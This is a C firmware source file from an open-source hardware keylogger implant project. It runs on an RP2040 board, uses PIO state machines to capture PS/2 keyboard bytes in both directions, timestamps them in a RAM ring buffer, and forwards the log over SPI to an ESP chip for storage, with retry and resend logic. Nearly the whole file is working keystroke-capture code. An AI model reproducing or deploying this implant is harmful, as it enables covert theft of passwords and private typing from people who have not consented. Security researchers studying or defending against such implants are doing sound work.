/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

// The code assumes a copy_to_ram image (CMakeLists.txt): all of it runs from RAM.

#include "hardware/clocks.h"
#include "hardware/flash.h"
#include "hardware/irq.h"
#include "hardware/pio.h"
#include "hardware/pll.h"
#include "hardware/regs/io_qspi.h"
#include "hardware/spi.h"
#include "hardware/structs/clocks.h"
#include "hardware/structs/ioqspi.h"
#include "hardware/structs/pll.h"
#include "hardware/structs/sio.h"
#include "hardware/sync.h"
#include "hardware/timer.h"
#include "hardware/uart.h"
#include "hardware/watchdog.h"
#include "hardware/vreg.h"
#include "okhi.pio.h"
#include "pico/bootrom.h"
#include "pico/multicore.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>

#include "../../../../last_firmv.h"

#include "../../com/com.h"

// Capture runs at the default 125 MHz system clock (this file never sets it; an SPI benchmark
// run with the overclock option doubles it while it lasts), so clk_peri is 125 MHz and the PL022
// runs at 125e6 / (2 * 13) = 4.81 MHz: spi_set_baudrate() rounds the 5 MHz SPI_BAUD down to the
// nearest rate it can make.

#define RP_VARIANT OKHI_VARIANT_PS2
#define OTA_WATCHDOG_UPDATE() watchdog_update()

#include "../../com/com_rp.h"

#include "../../com/com_rp_hw.h"

#include "../../com/com_rp_ota.h"

#include "../../com/com_rp_clock.h"

// PS/2 bus pins and the PIO jump helpers. The four loaded programs take DAT_GPIO as their IN
// base, so DAT is in pin 0 and CLK in pin 1: CLK_GPIO must be DAT_GPIO + 1. A jmp pin is set
// apart from the IN base, so the AUX pins only need to be free GPIOs, which the RP drives as
// outputs. core0 drives AUX_D2H_JMP_GPIO to arm and abort device_to_host. No loaded program
// reads AUX_H2D_JMP_GPIO: host_to_device jumps on CLOCK, and main() only sets this pin high.
#define AUX_H2D_JMP_GPIO 19 // jmp helper for host_to_device, unused (a free GPIO)
#define DAT_GPIO 20         // PS/2 DATA
#define CLK_GPIO 21         // PS/2 CLOCK
#define AUX_D2H_JMP_GPIO 22 // device_to_host jmp pin: high parks it, low arms it (a free GPIO)

// One record per captured byte: 2000 records hold about 666 keystrokes at about 3 PS/2 bytes
// each, in 64000 bytes of RAM. core1 sends no record while the ESP is down (the esp_link_up test
// in core1_main), so the ring fills at the capture rate and has to hold a multi-second outage
// under heavy typing.
#define RING_BUFF_MAX_ENTRIES 2000

// PS/2 capture state, shared by the PIO IRQ handlers, the capture loop (core0) and core1.
// ringbuff holds each captured byte as a short timestamped text record; core0 writes it at
// write_index and core1 sends it to the ESP. kbd_h2d_sm, kbd_sm and their offsets name the
// host_to_device and device_to_host SMs, so the IRQ handlers can restart them.
volatile static unsigned int write_index = 0;
volatile static char ringbuff[RING_BUFF_MAX_ENTRIES][32];
// read_index is the oldest record the ESP has not confirmed (core1 moves it, in
// ps2_record_confirm). core0 reads it so it never overwrites a record that may still have to
// be sent again. ringbuff_dropped counts the bytes dropped because the ring was full (the ESP
// down too long).
volatile static unsigned int read_index = 0;
volatile static unsigned int ringbuff_dropped = 0;

volatile static uint kbd_h2d_sm;
volatile static uint offset_kbd_h2d;
volatile static uint kbd_sm;
volatile static uint offset_kbd;
volatile static int inhnr;
volatile static bool last_state_idle;
volatile static int inidle;
volatile static int inidletoggle;
volatile static bool inh_fired;

// device_to_host control. AUX_D2H_JMP_GPIO is its jmp pin: while it is high the program parks
// on its first instruction, while it is low the program captures. A restart forces the SM's
// program counter back to the program's first instruction.
static void restart_device_to_host_sm(void)
{
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));
}

// Force host_to_device back to its first instruction, so the next host transfer is captured
// from the start (after an inhibit with no RTS, and on idle).
static void restart_host_to_device_sm(void)
{
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));
}

// Disarm device_to_host: drive the arm pin high, wait until it reads back high (the level has
// propagated), then restart the SM, which parks at line 00.
static void stop_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, true);
    while (!gpio_get(AUX_D2H_JMP_GPIO))
    {
        tight_loop_contents();
    }
    restart_device_to_host_sm();
}

// Arm device_to_host: drive the arm pin low so the SM leaves line 00, then restart it so the
// capture starts at the next start bit.
static void start_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, false);
    restart_device_to_host_sm();
}

// PIO0 IRQ handler, for the events of inhibited_signal:
//   IRQ0: the host inhibits the bus (CLOCK low for 91 to 93 us). Park device_to_host, so a cut
//         byte is not pushed.
//   IRQ1: the inhibit ended without an RTS. Arm device_to_host and restart host_to_device.
// Each branch clears its own flag (write 1 to pio0_hw->irq) first.
void pio0_irq(void)
{
    // printf("\r\nPIO0 IRQ!\r\n");
    if (pio0_hw->irq & 1)
    {
        // printf("PIO0 IRQ & 1: %d\r\n", inhnr++);
        pio0_hw->irq = 1;
        stop_device_to_host_sm();
    }
    else if (pio0_hw->irq & 2)
    {
        // printf("PIO0 IRQ & 2: %d\r\n", inhnr++);
        pio0_hw->irq = 2;
        start_device_to_host_sm();
        restart_host_to_device_sm();
    }
}

// PIO1 IRQ handler, for the event of idle_signal:
//   IRQ0: the bus is idle (CLOCK and DATA both high for about 124 us). Arm device_to_host and
//         restart host_to_device for the next frame.
//   IRQ1: no PIO1 program raises it; the branch only clears the flag.
void pio1_irq(void)
{
    // printf("\r\nPIO1 IRQ!\r\n");
    if (pio1_hw->irq & 1)
    {
        // printf("PIO1 IRQ & 1: %d\r\n", inidle++);
        pio1_hw->irq = 1;
        start_device_to_host_sm();
        restart_host_to_device_sm();
    }
    else if (pio1_hw->irq & 2)
    {
        // printf("PIO1 IRQ & 2: %d\r\n", inhnr++);
        pio1_hw->irq = 2;
    }
}

// Delivery to the ESP, go-back-N on the sequence the ESP publishes: usb_report_flush of
// usb/rp/okhi.c on this ring (the comment over USB_SEND_WINDOW there gives the reasons). A record
// leaves the ring only once the ESP's sequence has passed it. Each record goes out once, at most
// PS2_SEND_WINDOW past the last confirmed one, with a poll between windows; when the sequence
// stops advancing for PS2_STALL_US, everything after it goes out again.
//
// The ESP stops answering for 20 to 30 ms on every keylog flush (about every 225 records here),
// and frames sent into that pause arrive cut or as zeros, sometimes every copy of a record.
// Measured on 2026-10-12: sending every record twice on the SLAVEREADY handshake and refilling
// holes only while the ring was idle lost 32 records in 3 of 5 runs of 20031 bytes, because under
// nonstop typing the ring is never idle and the ESP gave up after 32 records. As on USB, the
// sequence is aligned to the ESP's once after boot and again after the ESP was given up on, with
// nothing in flight, so an RP that rebooted under a running ESP does not send numbers the ESP
// reads as already seen.
#define PS2_SEND_WINDOW 4
#define PS2_POLL_GAP_US 500
#define PS2_POLL_IDLE_US 5000
#define PS2_STALL_US 30000
#define PS2_PATIENCE_US 1500000

static uint8_t ps2_tail_seq = SPI_RECORD_SEQ_MIN; // sequence of the record at read_index
static unsigned int ps2_record_sent;              // next one to clock out, read_index <= sent <= high
static unsigned int ps2_record_high;              // one past the furthest record clocked out
static unsigned int ps2_spi_resends;
static unsigned int total_packets_sended; // records the ESP has confirmed
static bool ps2_esp_gone;
static bool ps2_seq_synced;
// SPI_RECORD_HEADER plus the 27 byte record text and its NUL.
static unsigned char ps2_spi_frame[48];

static uint8_t ps2_seq_add(uint8_t seq, unsigned int n)
{
    return (uint8_t)(((seq - SPI_RECORD_SEQ_MIN + n) % SPI_RECORD_SEQ_MAX) + SPI_RECORD_SEQ_MIN);
}

static int ps2_spi_write_record(const uint8_t *src, size_t len)
{
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, true);

    if (!wait_esp_ready(SPI_READY_TIMEOUT_US))
    {
        gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
        return -1;
    }

    gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
    return my_spi_write_blocking(src, len);
}

// Move read_index past every record the ESP's published sequence says it holds.
static bool ps2_record_confirm(void)
{
    if (!esp_record_seq_seen)
    {
        return false;
    }

    uint8_t confirmed = spi_seq_delta(ps2_seq_add(ps2_tail_seq, SPI_RECORD_SEQ_MAX - 1), esp_record_seq);

    if (confirmed == 0 || confirmed > ps2_record_high - read_index)
    {
        return false;
    }

    read_index += confirmed;
    ps2_tail_seq = ps2_seq_add(ps2_tail_seq, confirmed);
    total_packets_sended += confirmed;

    if (ps2_record_sent < read_index)
    {
        ps2_record_sent = read_index;
    }

    return true;
}

static void ps2_record_flush(void)
{
    if (ps2_esp_gone && !esp_link_up)
    {
        return;
    }

    ps2_esp_gone = false;

    uint64_t confirmed = time_us_64();
    uint64_t progress = confirmed;

    while (read_index != write_index)
    {
        if (time_us_64() - confirmed > PS2_PATIENCE_US)
        {
            ps2_esp_gone = true;
            ps2_seq_synced = false;
            esp_link_up = false;
            return;
        }

        if (!ps2_seq_synced && ps2_record_high == read_index && esp_record_seq_seen)
        {
            ps2_tail_seq = spi_seq_next(esp_record_seq);
            ps2_seq_synced = true;
        }

        if (ps2_record_sent != write_index && ps2_record_sent - read_index < PS2_SEND_WINDOW)
        {
            ps2_spi_frame[0] = SPI_RECORD_MARKER;
            ps2_spi_frame[1] = ps2_seq_add(ps2_tail_seq, ps2_record_sent - read_index);
            sprintf((char *)ps2_spi_frame + SPI_RECORD_HEADER, "%s   \r\n",
                    (char *)&(ringbuff[ps2_record_sent % RING_BUFF_MAX_ENTRIES][0]));
            size_t len = SPI_RECORD_HEADER + strlen((char *)ps2_spi_frame + SPI_RECORD_HEADER);

            if (ps2_spi_write_record(ps2_spi_frame, len) >= 0)
            {
                // Pacing only, the sequence is the acknowledgement: let the ESP close this
                // transaction before the next frame starts.
                wait_esp_consumed(SPI_CONSUMED_TIMEOUT_US);

                // Logged once, the first time it goes out; a resend is not a new record.
                if (ps2_record_sent == ps2_record_high)
                {
                    printf("%s", (char *)ps2_spi_frame + SPI_RECORD_HEADER);
                    ps2_record_high++;
                }

                ps2_record_sent++;
                continue;
            }
        }

        // Window full, everything sent and not yet confirmed, or the ESP not armed: look at its
        // sequence. A missed poll is the ESP busy, not gone, until PS2_PATIENCE_US says otherwise.
        busy_wait_us(esp_link_up ? PS2_POLL_GAP_US : PS2_POLL_IDLE_US);
        poll_esp();
        wait_esp_consumed(SPI_CONSUMED_TIMEOUT_US);

        uint64_t now = time_us_64();

        if (esp_link_up && ps2_record_confirm())
        {
            confirmed = now;
            progress = now;
        }
        else if (esp_link_up && now - progress > PS2_STALL_US)
        {
            ps2_record_sent = read_index;
            ps2_spi_resends++;
            progress = now;
        }
    }
}

void core1_main()
{
    sleep_ms(2000);
    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
    gpio_pull_up(ESP_RESET_GPIO);
    sleep_ms(2000);

    esp_link_uart_init();

    // SLAVEREADY high means the ESP has a transaction armed: it raises the line in
    // spi_post_setup_cb and drops it in spi_post_trans_cb. The RP's pull-up also holds the line
    // high while the ESP boots, so "SLAVE READY!" is only a hint: records wait for esp_link_up.
    bool slave_ready = false;

    for (int i = 0; i < 3000; i++)
    {
        if (gpio_get(ELOG_SLAVEREADY_GPIO))
        {
            slave_ready = true;
            break;
        }

        tight_loop_contents();
    }

    puts(slave_ready ? "SLAVE READY!" : "ESP slave not armed yet, the poll loop will keep retrying");

    esp_link_master_init();

    while (1)
    {
        // Drain to the ESP only while a poll has confirmed it alive. The RP pulls ELOG_SLAVEREADY
        // up, so while the ESP boots or resets that line floats high and a record clocked at it
        // would be lost; esp_link_up is set only by a valid poll response the pull-up cannot fake.
        // Until then the log waits in ringbuff.
        if (esp_link_up)
        {
            ps2_record_flush();
        }

        poll_esp_if_due();

        report_packets_sent(total_packets_sended);

        // Recovery working, not loss: the ESP stopped confirming for PS2_STALL_US and everything after
        // its sequence went out again. Printed from core1 only (core0 must not touch stdio while core1
        // does).
        static unsigned int ps2_spi_resends_reported = 0;
        if (ps2_spi_resends != ps2_spi_resends_reported)
        {
            ps2_spi_resends_reported = ps2_spi_resends;
            printf("ps2 spi resent from the esp's sequence %u times, %u records confirmed\r\n", ps2_spi_resends,
                   total_packets_sended);
        }

        static unsigned int ringbuff_dropped_reported = 0;
        if (ringbuff_dropped != ringbuff_dropped_reported)
        {
            ringbuff_dropped_reported = ringbuff_dropped;
            printf("ps2 ringbuff dropped %u bytes (ESP down too long, log backed up)\r\n", ringbuff_dropped);
        }

        static uint32_t esp_reset_glitches_reported = 0;
        if (esp_reset_glitches != esp_reset_glitches_reported)
        {
            esp_reset_glitches_reported = esp_reset_glitches;
            printf("esp reset line low for %u us and back up: not an external reset, no restart (%u so far)\r\n",
                   (unsigned)esp_reset_glitch_us, (unsigned)esp_reset_glitches);
        }
    }
}

int main(void)
{
    watchdog_disable();

    boot_press();
    ota_boot_check();
    clock_mode_boot_check();
    blink_led(2);

    delay_boot_if_esp_reset_detected();

    rp_board_boot_init();

    report_last_fault();

    printf("\r\nokhi PS2 started! Hardware v%s\r\nBuild Date %s %s\r\n", hwver_name, __DATE__, __TIME__);
    fflush(stdout);

    uint32_t baud __attribute__((unused)) = rp_spi_master_init();
    printf("SPI Mode 0: %.2f MHz (%d)\r\n", ((float)baud) / 1000000.0, baud);

    gpio_put(USOE_PIN, false);

    report_flash_layout();
    report_flash_size();
    report_ota_state();

    // GPIOs of the PIO programs.
    gpio_init(DAT_GPIO);
    gpio_set_dir(DAT_GPIO, GPIO_IN);
    gpio_pull_up(DAT_GPIO);
    gpio_init(CLK_GPIO);
    gpio_set_dir(CLK_GPIO, GPIO_IN);
    gpio_pull_up(CLK_GPIO);
    gpio_init(AUX_D2H_JMP_GPIO);
    gpio_set_dir(AUX_D2H_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_D2H_JMP_GPIO, false);
    gpio_init(AUX_H2D_JMP_GPIO);
    gpio_set_dir(AUX_H2D_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_H2D_JMP_GPIO, true);
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");
    printf("CLK_GPIO: %d\r\n", gpio_get(CLK_GPIO));
    printf("DAT_GPIO: %d\r\n", gpio_get(DAT_GPIO));
    printf("JMP_AUX D2H: %d\r\n", gpio_get(AUX_D2H_JMP_GPIO));
    printf("JMP_AUX H2D: %d\r\n", gpio_get(AUX_H2D_JMP_GPIO));

    pio_destroy();

    // host_to_device capture SM (PIO1 SM0).
    kbd_h2d_sm = pio_claim_unused_sm(pio1, true);
    offset_kbd_h2d = pio_add_program(pio1, &host_to_device_program);
    // PIO direction bits of DAT and CLK to input. The call passes kbd_sm, which is still 0 here
    // (main() sets it for pio0 below), and kbd_h2d_sm is SM 0 too, so it runs on this SM. It
    // changes no pad anyway: gpio_init() left DAT and CLK on the SIO function, where
    // gpio_set_dir() made them inputs, and a PIO reads every pin whatever its function.
    pio_sm_set_consecutive_pindirs(pio1, kbd_sm, DAT_GPIO, 2, false);
    // device_to_host's getter, not host_to_device's. The two differ only in the wrap: both put
    // .wrap_target at offset + 0, but device_to_host is 15 instructions (wrap top offset + 14)
    // and host_to_device 16 (offset + 15). So this SM wraps after line 14 and line 15
    // (skip_ack_bit) never runs. That is harmless: after the stop bit the SM wraps, clears the ISR
    // and waits at its inhibit gate, and the ACK's 30 to 50 us clock low is too short for a gate
    // that needs at least 74.9 us.
    pio_sm_config c_kbd_h2d = device_to_host_program_get_default_config(offset_kbd_h2d);
    // IN base: in pin 0 is DAT, in pin 1 is CLK.
    sm_config_set_in_pins(&c_kbd_h2d, DAT_GPIO);
    // Shift right, no autopush: the byte ends in bits [31:24] of the FIFO word, where main()
    // reads it.
    sm_config_set_in_shift(&c_kbd_h2d, true, false, 0);
    // jmp pin: CLOCK, for the inhibit gate.
    sm_config_set_jmp_pin(&c_kbd_h2d, CLK_GPIO);
    // No TX: its FIFO joins the RX FIFO, 8 words deep.
    sm_config_set_fifo_join(&c_kbd_h2d, PIO_FIFO_JOIN_RX);
    // About 133.6 kHz (7.485 us per cycle): 8 SM cycles per PS/2 clock at its fastest, 16.7 kHz.
    float div_kbd_h2d = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd_h2d, div_kbd_h2d);
    pio_sm_init(pio1, kbd_h2d_sm, offset_kbd_h2d, &c_kbd_h2d);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, false);
    pio_sm_clear_fifos(pio1, kbd_h2d_sm);
    pio_sm_restart(pio1, kbd_h2d_sm);
    pio_sm_clkdiv_restart(pio1, kbd_h2d_sm);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, true);
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));

    // idle_signal SM (PIO1 SM1), raises PIO1 IRQ0.
    uint kbd_idle_sm = pio_claim_unused_sm(pio1, true);
    uint offset_idle = pio_add_program(pio1, &idle_signal_program);
    pio_sm_set_consecutive_pindirs(pio1, kbd_idle_sm, DAT_GPIO, 2, false);
    pio_sm_config c_idle = idle_signal_program_get_default_config(offset_idle);
    // IN base: in pin 0 is DAT, in pin 1 is CLK.
    sm_config_set_in_pins(&c_idle, DAT_GPIO);
    sm_config_set_fifo_join(&c_idle, PIO_FIFO_JOIN_RX);
    // jmp pin: CLOCK, though idle_signal never tests it.
    sm_config_set_jmp_pin(&c_idle, CLK_GPIO);
    // 1 MHz
    float div_idle = clock_get_hz(clk_sys) / 1000000.0;
    sm_config_set_clkdiv(&c_idle, div_idle);
    // PIO1's IRQ flags 0 to 3 (source bits 8 to 11) to PIO1_IRQ_0, handled by pio1_irq.
    pio_set_irq0_source_mask_enabled(pio1, 0x0F00, true);
    irq_set_exclusive_handler(PIO1_IRQ_0, pio1_irq);
    irq_set_enabled(PIO1_IRQ_0, true);
    pio_sm_init(pio1, kbd_idle_sm, offset_idle, &c_idle);
    pio_sm_set_enabled(pio1, kbd_idle_sm, false);
    pio_sm_clear_fifos(pio1, kbd_idle_sm);
    pio_sm_restart(pio1, kbd_idle_sm);
    pio_sm_clkdiv_restart(pio1, kbd_idle_sm);
    pio_sm_set_enabled(pio1, kbd_idle_sm, true);
    pio_sm_exec(pio1, kbd_idle_sm, pio_encode_jmp(offset_idle));

    // inhibited_signal SM (PIO0 SM0), raises PIO0 IRQ0 and IRQ1.
    uint kbd_inh_sm = pio_claim_unused_sm(pio0, true);
    uint offset_inh = pio_add_program(pio0, &inhibited_signal_program);
    pio_sm_set_consecutive_pindirs(pio0, kbd_inh_sm, DAT_GPIO, 2, false);
    pio_sm_config c_inh = inhibited_signal_program_get_default_config(offset_inh);
    // IN base: in pin 0 is DAT, in pin 1 is CLK.
    sm_config_set_in_pins(&c_inh, DAT_GPIO);
    sm_config_set_fifo_join(&c_inh, PIO_FIFO_JOIN_RX);
    // jmp pin: CLOCK
    sm_config_set_jmp_pin(&c_inh, CLK_GPIO);
    // 1 MHz
    float div_inh = clock_get_hz(clk_sys) / 1000000.0;
    sm_config_set_clkdiv(&c_inh, div_inh);
    // PIO0's IRQ flags 0 to 3 (source bits 8 to 11) to PIO0_IRQ_0, handled by pio0_irq.
    pio_set_irq0_source_mask_enabled(pio0, 0x0F00, true);
    irq_set_exclusive_handler(PIO0_IRQ_0, pio0_irq);
    irq_set_enabled(PIO0_IRQ_0, true);
    pio_sm_init(pio0, kbd_inh_sm, offset_inh, &c_inh);
    pio_sm_set_enabled(pio0, kbd_inh_sm, false);
    pio_sm_clear_fifos(pio0, kbd_inh_sm);
    pio_sm_restart(pio0, kbd_inh_sm);
    pio_sm_clkdiv_restart(pio0, kbd_inh_sm);
    pio_sm_set_enabled(pio0, kbd_inh_sm, true);
    pio_sm_exec(pio0, kbd_inh_sm, pio_encode_jmp(offset_inh));

    // device_to_host capture SM (PIO0 SM1).
    kbd_sm = pio_claim_unused_sm(pio0, true);
    offset_kbd = pio_add_program(pio0, &device_to_host_program);
    // PIO direction bits of the 3 pins from DAT_GPIO (DAT, CLK, AUX_D2H) to input. No pad
    // changes: AUX_D2H stays the SIO output core0 drives, and the SM reads it as its jmp pin.
    pio_sm_set_consecutive_pindirs(pio0, kbd_sm, DAT_GPIO, 3, false);
    pio_sm_config c_kbd = device_to_host_program_get_default_config(offset_kbd);
    // IN base: in pin 0 is DAT, in pin 1 is CLK.
    sm_config_set_in_pins(&c_kbd, DAT_GPIO);
    // Shift right, no autopush: the byte ends in bits [31:24] of the FIFO word. The commented
    // line below is the 8-bit autopush alternative, not used: with it the program's own push
    // would add a zero word after every byte.
    // sm_config_set_in_shift(&c_kbd, true, true, 8);
    sm_config_set_in_shift(&c_kbd, true, false, 0);
    // jmp pin: AUX_D2H_JMP_GPIO, the arm and abort switch core0 drives (not CLOCK).
    sm_config_set_jmp_pin(&c_kbd, AUX_D2H_JMP_GPIO);
    // No TX: its FIFO joins the RX FIFO, 8 words deep.
    sm_config_set_fifo_join(&c_kbd, PIO_FIFO_JOIN_RX);
    // About 133.6 kHz (7.485 us per cycle): 8 SM cycles per PS/2 clock at its fastest, 16.7 kHz.
    float div_kbd = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd, div_kbd);
    pio_sm_init(pio0, kbd_sm, offset_kbd, &c_kbd);
    pio_sm_set_enabled(pio0, kbd_sm, false);
    pio_sm_clear_fifos(pio0, kbd_sm);
    pio_sm_restart(pio0, kbd_sm);
    pio_sm_clkdiv_restart(pio0, kbd_sm);
    pio_sm_set_enabled(pio0, kbd_sm, true);
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));

    start_device_to_host_sm();
    restart_host_to_device_sm();

    multicore_launch_core1(core1_main);
    sleep_ms(1);
    multicore_reset_core1();
    multicore_launch_core1(core1_main);

    // Capture loop on core0: drain both RX FIFOs. Each capturer leaves its byte in the top byte of
    // the 32-bit FIFO word, read through an 8-bit pointer at +3 (see the ISR note in okhi.pio).
    // Each byte becomes a ring record, tagged H (host to device) or D (device to host) with a
    // millisecond timestamp, which core1 sends to the ESP.
    // If the capture loop stalls for more than 4 s, the watchdog reboots the RP (the loop feeds it
    // through capture_note_traffic and capture_note_idle).
    watchdog_enable(4000, 0);

    while (1)
    {
        bool got_byte = false;

        if (!pio_sm_is_rx_fifo_empty(pio1, kbd_h2d_sm))
        {
            uint8_t byte = *((io_rw_8 *)&pio1->rxf[kbd_h2d_sm] + 3);
            // Never overwrite a record the ESP has not confirmed. With the ring full (the ESP down
            // long enough to back it up), drop the newest byte and count it: an overwrite would
            // lose a byte silently and could race core1 while it formats that record.
            if ((write_index - read_index) < RING_BUFF_MAX_ENTRIES)
            {
                sprintf((char *)&(ringbuff[write_index % RING_BUFF_MAX_ENTRIES][0]), "%c:0x%02X t:0x%08X ; ", 'H',
                        byte, us_to_ms(time_us_64()));
                write_index++;
            }
            else
            {
                ringbuff_dropped++;
            }
            got_byte = true;
        }
        if (!pio_sm_is_rx_fifo_empty(pio0, kbd_sm))
        {
            uint8_t byte = *((io_rw_8 *)&pio0->rxf[kbd_sm] + 3);
            if ((write_index - read_index) < RING_BUFF_MAX_ENTRIES)
            {
                sprintf((char *)&(ringbuff[write_index % RING_BUFF_MAX_ENTRIES][0]), "%c:0x%02X t:0x%08X ; ", 'D',
                        byte, us_to_ms(time_us_64()));
                write_index++;
            }
            else
            {
                ringbuff_dropped++;
            }
            got_byte = true;
        }

        if (got_byte)
        {
            capture_note_traffic();
        }
        else
        {
            capture_note_idle();
        }
    }

    return 0;
}
